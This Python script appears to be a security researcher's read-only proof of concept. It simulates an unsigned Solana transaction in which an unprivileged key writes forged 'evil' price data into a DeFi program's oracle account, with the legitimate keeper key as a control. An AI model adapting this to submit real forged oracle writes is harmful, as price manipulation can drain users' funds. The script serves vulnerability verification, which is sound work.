#!/usr/bin/env python3
"""Read-only simulation: can a FRESH unprivileged key write arbitrary data to a
dijkbk-owned oracle account? Uses simulateTransaction (sigVerify=false) - NOTHING is sent.
"""
import json, os, sys, base64, time, urllib.request, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc

OUT = os.path.dirname(os.path.abspath(__file__))
B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
DIJKBK = "dijkbkCAKfFTCxQg3u1pg82gVU1jJGHBBRcteD11mBu"
ORACLE_7YEC = "7yecFG22heommABQ5svcbQLK1Ua4ZrJsHPiktZ17jfm3"


def b58d(s):
    n = 0
    for c in s:
        n = n * 58 + B58.index(c)
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    pad = 0
    for c in s:
        if c == "1":
            pad += 1
        else:
            break
    return b"\x00" * pad + b


def cu16(n):
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            return out


def build_legacy_tx(payer, keys, ixs, blockhash):
    """keys: list of (pubkey_b58, is_signer, is_writable). ixs: list of (prog_idx, [acct_idx], data)."""
    # order: fee payer first; then writable signers, readonly signers, writable non-signers, readonly non-signers
    def rank(k):
        pk, s, w = k
        return (0 if pk == payer else 1, 0 if (s and w) else 1 if s else 2 if w else 3)
    ordered = [keys[0]] + sorted(keys[1:], key=rank)
    idx_map = {pk: i for i, (pk, _, _) in enumerate(ordered)}
    nsig = sum(1 for _, s, _ in ordered if s)
    nro_sig = sum(1 for _, s, w in ordered if s and not w)
    nro_unsig = sum(1 for _, s, w in ordered if not s and not w)
    hdr = bytes([nsig, nro_sig, nro_unsig])
    msg = hdr + cu16(len(ordered))
    for pk, _, _ in ordered:
        msg += b58d(pk)
    msg += b58d(blockhash)
    msg += cu16(len(ixs))
    for pid, accts, data in ixs:
        msg += bytes([pid])
        msg += cu16(len(accts))
        msg += bytes(accts)
        msg += cu16(len(data))
        msg += data
    tx = cu16(nsig) + b"\x00" * (64 * nsig) + msg
    return base64.b64encode(tx).decode(), idx_map, ordered


def main():
    slot_info = rpc("getLatestBlockhash", [{"commitment": "finalized"}])
    blockhash = slot_info["result"]["value"]["blockhash"]
    slot = rpc("getSlot", [{"commitment": "finalized"}])["result"]
    print("blockhash", blockhash, "slot", slot)

    # Test A: unprivileged existing signer (Jupiter tip account, unrelated to GoonFi)
    unpriv = "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5"
    # Test B (control): the keeper key observed in real update txs
    keeper = "FTp1BybZ51NiZKbnZH6MsrV3tUZNauhpQMbBcqYUEr5f"

    evil = struct.pack("<Q", 999_999_999_999) + struct.pack("<Q", 999_999_999_999) + \
        struct.pack("<I", slot) + struct.pack("<I", 1_000_000) + struct.pack("<Q", int(time.time() * 1000))
    print("evil data:", evil.hex())

    for label, payer in [("A-unprivileged", unpriv), ("B-keeper-control", keeper)]:
        keys = [
            (payer, True, True),
            (ORACLE_7YEC, False, True),
            (DIJKBK, False, False),
        ]
        ixs = [(2, [0, 1], evil)]
        tx_b64, idx_map, ordered = build_legacy_tx(payer, keys, ixs, blockhash)
        sim = rpc("simulateTransaction", [tx_b64, {
            "encoding": "base64",
            "sigVerify": False,
            "replaceRecentBlockhash": True,
            "commitment": "processed",
            "accounts": {"encoding": "base64", "addresses": [ORACLE_7YEC]},
        }])
        res = sim.get("result", {})
        v = res.get("value", {})
        print(f"== {label} payer={payer}")
        print("   err:", json.dumps(v.get("err")))
        print("   logs:", v.get("logs"))
        print("   unitsConsumed:", v.get("unitsConsumed"))
        accts = v.get("accounts", [])
        if accts and accts[0]:
            raw = base64.b64decode(accts[0]["data"][0])
            print("   post-sim oracle data:", raw.hex())
            print("   MATCHES EVIL:", raw == evil)
        else:
            print("   no account data returned")
        with open(os.path.join(OUT, f"sim-oracle-write-{label}.json"), "w") as f:
            json.dump({"label": label, "payer": payer, "slot": slot, "blockhash": blockhash,
                       "evil_data": evil.hex(), "sim_result": res}, f, indent=1)


def _b58_of(b):
    n = int.from_bytes(b, "big")
    s = ""
    while n:
        n, r = divmod(n, 58)
        s = B58[r] + s
    for byte in b:
        if byte == 0:
            s = "1" + s
        else:
            break
    return s


if __name__ == "__main__":
    main()
